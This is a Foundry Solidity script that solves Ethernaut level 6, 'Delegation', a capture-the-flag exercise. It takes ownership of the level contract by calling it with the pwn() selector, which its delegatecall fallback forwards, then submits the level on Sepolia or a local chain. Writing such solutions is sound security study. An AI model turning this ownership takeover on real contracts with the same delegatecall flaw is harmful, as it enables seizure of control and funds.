// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Delegation, Delegate} from "src/06/Delegation.sol";
import {DelegationFactory} from "src/06/DelegationFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";

contract DelegationExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL6_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new DelegationFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        (bool sent,) = instance.call(abi.encodeWithSelector(Delegate.pwn.selector));
        require(sent, "Call failed");

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}
